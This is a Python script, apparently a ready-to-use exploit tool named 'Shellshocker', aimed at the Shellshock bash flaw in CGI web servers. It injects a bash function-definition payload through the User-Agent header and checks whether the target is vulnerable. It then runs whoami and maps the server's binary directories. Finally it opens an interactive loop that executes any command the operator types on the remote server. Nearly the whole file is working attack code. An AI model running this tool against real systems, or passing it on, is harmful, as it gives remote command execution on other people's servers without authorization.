import requests
import time


#This function runs the passed in command on the target host
def run_command(bash_command, target):
    session = requests.Session()
    session.headers['User-Agent'] = '() { ignored; };echo Content-Type: text/html; echo ; ' + bash_command
    try:
        response = session.get(target)
        contents = response.text
    except:
        print("Unable to connect to target.  "
              "Ensure you have provided a complete URL, e.g http://192.168.56.101/cgi-bin/example-bash.sh")
        time.sleep(5)
        quit()
    return contents


#This function check if the server is vulnerable to Shellshock
def is_vulnerable(url):
    response = run_command("echo vulnerable", url)
    if "vulnerable" in response:
        return True
    else:
        return False


#This function check which user the exploit is running as
def check_user(url):
    user = run_command("/usr/bin/whoami", url)
    return user


#This function adds the full path to common commands - Add a command to list to use without having to prepend path
def resolve_command(command, url):
    #Get all the commands in the /bin directory
    response = str(run_command("/bin/ls /bin", url))
    _bin = response.split()

    #Get all the commands in the /sbin directory
    response = str(run_command("/bin/ls /sbin", url))
    _sbin = response.split()

    #Get all the commands in the /usr/bin directory
    response = str(run_command("/bin/ls /usr/bin", url))
    usr_bin = response.split()

    if command[0] != "/":
        sub_command = command.split() # get the just command without any parameters
        for word in _bin:
            if word == sub_command[0]:
                return "/bin/"+command
        for word in usr_bin:
            if word == sub_command[0]:
                return "/usr/bin/"+command
        for word in _sbin:
            if word == sub_command[0]:
                return "/sbin/"+command

        return command
    else:
        return command


def main():
    url = input('Input the URL or IP for the server you would to exploit: ')
    if is_vulnerable(url):
        user = str(check_user(url)).rstrip()
        command_prompt = user + ":$"
        print("This server is vulnerable, user is: " + user)
        go_to_shell = input("Would like to to go to shell (Y/N): ")
        go_to_shell = go_to_shell.lower()
        if go_to_shell == "y":
            print("Hit Q then return to quit shell at any time")
            command = ""
            while command != "q" and "Q":
                command = resolve_command(input(command_prompt),url)
                response = run_command(command, url)
                print(response)
        else:
            print("Shellshocker existing...")
    else:
        print("This script is not vulnerable")

main()













